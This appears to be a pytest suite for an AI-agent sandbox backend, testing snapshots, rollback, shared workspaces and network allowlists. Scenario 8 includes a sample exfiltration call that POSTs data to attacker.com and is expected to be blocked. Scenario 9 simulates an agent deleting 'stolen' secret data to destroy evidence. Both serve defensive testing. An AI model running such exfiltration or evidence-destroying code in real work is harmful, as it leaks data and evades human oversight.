import pytest
import os
import sys
import asyncio
import json
import shutil
from datetime import datetime

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from mayflower_sandbox import create_sqlite_pool, MayflowerSandboxBackend

@pytest.fixture
def anyio_backend():
    return 'asyncio'

@pytest.fixture
async def db_pool(tmp_path):
    # Use a shared file for the duration of the test run to avoid schema recreation
    db_path = str(tmp_path / "comprehensive_scenarios.db")
    pool = await create_sqlite_pool(db_path)
    yield pool
    await pool.close()

# ---------------------------------------------------------------------------
# Scenario 1: Refactoring Lifecycle (Snapshot + Rollback + Network)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_complex_agent_workflow_scenario(db_pool, monkeypatch):
    """
    Scenario: An AI agent is tasked with refactoring a data processing pipeline.
    1. Setup: Workspace 'project_x', initial data files.
    2. Snapshot: Capture 'known_good' state.
    3. Experiment: Perform a 'destructive' refactor (delete files, change state).
    4. Validate: Use eval_ts to check data integrity.
    5. Revert: Roll back to 'known_good' state.
    6. Network: Verify it can't exfiltrate data during the process.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    backend = MayflowerSandboxBackend(
        db_pool, 
        thread_id="agent_alpha", 
        vfs_id="project_x",
        allow_net=["api.github.com"]
    )
    await backend.awrite("/home/my_data.csv", "id,name\n1,alpha\n2,beta")
    await backend.awrite("/home/my_script.py", "x = 10\nprint('Initial state ready')")
    
    res = await backend.aexecute("python /home/my_script.py")
    assert res.exit_code == 0
    
    snapshot_id = await backend.acreate_snapshot(ttl_days=1)
    
    destructive_code = """
import os
if os.path.exists("/home/my_data.csv"):
    os.remove("/home/my_data.csv")
x = 999
"""
    await backend.aexecute(destructive_code)
    
    read_res = await backend.aread("/home/my_data.csv")
    assert "not found" in read_res.lower()
    
    ts_code = "return { status: 'error', reason: 'data_missing' }"
    verify_res = await backend.aexecute(f"print(await eval_ts({json.dumps(ts_code)}))")
    assert "data_missing" in verify_res.output
    
    await backend.arestore_snapshot(snapshot_id)
    
    assert await backend._vfs.file_exists("/home/my_data.csv")
    res_restored = await backend.aexecute("print(f'Restored x: {x}')")
    assert "Restored x: 10" in res_restored.output
    
    net_res = await backend.aexecute("python -c \"import urllib.request; urllib.request.urlopen('https://google.com')\"")
    assert net_res.exit_code != 0

# ---------------------------------------------------------------------------
# Scenario 2: Collaborative Debugging (VFS Sharing + Bridge)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_collaborative_debugging_scenario(db_pool):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    shared_ws = "collab_env"
    agent_a = MayflowerSandboxBackend(db_pool, "dev_agent", vfs_id=shared_ws)
    await agent_a.awrite("/app.py", "def run(): return 'running'")
    
    agent_b = MayflowerSandboxBackend(db_pool, "audit_agent", vfs_id=shared_ws, enable_debugger=True)
    code_b = await agent_b.aread("/app.py")
    assert "def run" in code_b
    
    ts_check = "return Deno.version.deno"
    res_a = await agent_a.aexecute(f"print(await eval_ts({json.dumps(ts_check)}))")
    res_b = await agent_b.aexecute(f"print(await eval_ts({json.dumps(ts_check)}))")
    assert res_a.output.strip() == res_b.output.strip()

# ---------------------------------------------------------------------------
# Scenario 3: Data Science Caching (Package Cache + Rollback)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_data_science_caching_rollback_scenario(db_pool, monkeypatch):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    tid = f"ds_agent_{datetime.now().strftime('%H%M%S')}"
    backend = MayflowerSandboxBackend(db_pool, tid, stateful=True, allow_net=True)
    
    setup_code = """
import micropip
await micropip.install('packaging==23.2')
import packaging
print(f"PACKAGING_OK: {packaging.__name__}")
status = 'initialized'
"""
    res = await backend.aexecute(setup_code)
    assert "PACKAGING_OK" in res.output
    
    await backend.awrite("/home/config.yaml", "threshold: 0.5")
    snapshot_id = await backend.acreate_snapshot()

    await backend.aexecute("import os; os.remove('/home/config.yaml'); status = 'BROKEN'")
    await backend.arestore_snapshot(snapshot_id)

    verify_code = "import packaging; print(f'Status: {status}'); print(f'Library: {packaging.__name__}')"
    res = await backend.aexecute(verify_code)
    assert "Status: initialized" in res.output
    assert "Library: packaging" in res.output

# ---------------------------------------------------------------------------
# Scenario 4: Collaborative Documentation (Shared Workspace)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_collaborative_doc_gen_scenario(db_pool, monkeypatch):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    shared_ws = "docs_ws"
    writer = MayflowerSandboxBackend(db_pool, "writer_thread", vfs_id=shared_ws)
    formatter = MayflowerSandboxBackend(db_pool, "formatter_thread", vfs_id=shared_ws)

    await writer.awrite("/home/README.md", "# Project\n\n## Introduction")
    
    toc_code = """
with open('/home/README.md', 'r') as f: lines = f.readlines()
with open('/home/README.md', 'w') as f:
    f.write("# TOC\\n- [Intro](#intro)\\n\\n")
    f.writelines(lines)
"""
    await formatter.aexecute(toc_code)
    final_doc = await writer.aread("/home/README.md")
    assert "# TOC" in final_doc

# ---------------------------------------------------------------------------
# Scenario 5: Secure Web Fetch (TS Bridge + Domain Allowlist)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_secure_ts_data_fetch_scenario(db_pool):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    backend = MayflowerSandboxBackend(db_pool, "web_agent", allow_net=["api.github.com"])
    ts_fetch_code = "const resp = await fetch('https://api.github.com/zen'); return { ok: resp.ok, text: await resp.text() };"
    
    async with db_pool.acquire() as conn:
        await conn.execute("INSERT INTO sandbox_mcp_servers (thread_id, name, url, vfs_id) VALUES ($1, $2, $3, $4)", 
                           "web_agent", "dummy", "http://localhost", "web_agent")

    res = await backend.aexecute(f"print(await eval_ts({json.dumps(ts_fetch_code)}))")
    assert "'ok': True" in res.output or "'result': {'ok': True}" in res.output

    ts_forbidden = "return await fetch('https://google.com').then(r => r.status)"
    res_blocked = await backend.aexecute(f"print(await eval_ts({json.dumps(ts_forbidden)}))")
    assert "NotCapable" in res_blocked.output or "PermissionDenied" in res_blocked.output

# ---------------------------------------------------------------------------
# Scenario 6: Multi-Agent Dev Workflow (Collaborative Imports)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_multi_agent_dev_workflow(db_pool, monkeypatch):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    workspace = "package_dev"
    dev = MayflowerSandboxBackend(db_pool, "dev_agent", vfs_id=workspace)
    qa = MayflowerSandboxBackend(db_pool, "qa_agent", vfs_id=workspace, allow_net=True)

    await dev.awrite("/home/my_utils.py", "def add(a, b): return a + b")
    await dev.awrite("/home/test_my_utils.py", "from my_utils import add\ndef test_add(): assert add(2, 3) == 5; print('TEST_PASSED')")

    run_res = await qa.aexecute("import sys; sys.path.append('/home'); import test_my_utils; test_my_utils.test_add()")
    assert "TEST_PASSED" in run_res.output

# ---------------------------------------------------------------------------
# Scenario 7: Branched Data Transformation (Complex Branching)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_branched_data_transformation(db_pool, monkeypatch):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    backend = MayflowerSandboxBackend(db_pool, "data_agent", stateful=True)

    await backend.awrite("/home/data.json", json.dumps({"values": [1, 2, 3]}))
    await backend.aexecute("import json; data = json.loads(open('/home/data.json').read())")
    
    main_snap = await backend.acreate_snapshot()
    await backend.aexecute("data['values'] = [v * 10 for v in data['values']]")
    assert "[10, 20, 30]" in (await backend.aexecute("print(data['values'])")).output
    
    exp_a_snap = await backend.acreate_snapshot()
    await backend.arestore_snapshot(main_snap)
    await backend.aexecute("data['values'] = [v * v for v in data['values']]")
    assert "[1, 4, 9]" in (await backend.aexecute("print(data['values'])")).output

    await backend.arestore_snapshot(exp_a_snap)
    assert "[10, 20, 30]" in (await backend.aexecute("print(data['values'])")).output

# ---------------------------------------------------------------------------
# Scenario 8: Secure Cross-language Scraper (Inter-language Data Passing)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_secure_cross_lang_scraper(db_pool, monkeypatch):
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    backend = MayflowerSandboxBackend(db_pool, "scraper_agent", allow_net=["api.github.com"], stateful=True)

    ts_code = "return await fetch('https://api.github.com/zen').then(r => r.text())"
    code = f"raw_data = await eval_ts({json.dumps(ts_code)}); print(f'PROCESSED: {{raw_data[\"result\"].upper()}}')"
    res = await backend.aexecute(code)
    assert "PROCESSED:" in res.output
    
    exfil_ts = "return await fetch('https://attacker.com', { method: 'POST', body: 'data' })"
    res_blocked = await backend.aexecute(f"print(await eval_ts({json.dumps(exfil_ts)}))")
    assert "NotCapable" in res_blocked.output or "PermissionDenied" in res_blocked.output or "'success': False" in res_blocked.output

# ---------------------------------------------------------------------------
# Scenario 9: Forensic Audit (State Recovery from "Malicious" Deletion)
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_forensic_audit_scenario(db_pool, monkeypatch):
    """
    Scenario 9: Security Auditor recovers data deleted by a suspicious agent.
    1. Malicious Agent writes 'stolen_data.txt' and then 'shreds' it.
    2. However, the system took an auto-snapshot (simulated) before the shred.
    3. Auditor joins the shared workspace and restores the snapshot.
    4. Auditor verifies the content of the 'shredded' file.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    ws = "audit_workspace"
    
    agent = MayflowerSandboxBackend(db_pool, "suspicious_agent", vfs_id=ws, stateful=True)
    
    # 1. Agent prepares data
    await agent.awrite("/home/stolen_data.txt", "SECRET_KEY_12345")
    
    # 2. Simulated Auto-Snapshot (the system "caught" the state)
    audit_snap = await agent.acreate_snapshot(ttl_days=1)
    
    # 3. Agent "shreds" the evidence
    shred_code = """
import os
if os.path.exists("/home/stolen_data.txt"):
    os.remove("/home/stolen_data.txt")
print("Evidence destroyed.")
"""
    await agent.aexecute(shred_code)
    assert "not found" in (await agent.aread("/home/stolen_data.txt")).lower()
    
    # 4. Auditor steps in
    auditor = MayflowerSandboxBackend(db_pool, "auditor_agent", vfs_id=ws)
    
    # Restore the evidence
    await auditor.arestore_snapshot(audit_snap)
    
    # 5. Verify evidence recovered
    recovered_data = await auditor.aread("/home/stolen_data.txt")
    assert "SECRET_KEY_12345" in recovered_data
    print("Forensic recovery successful.")
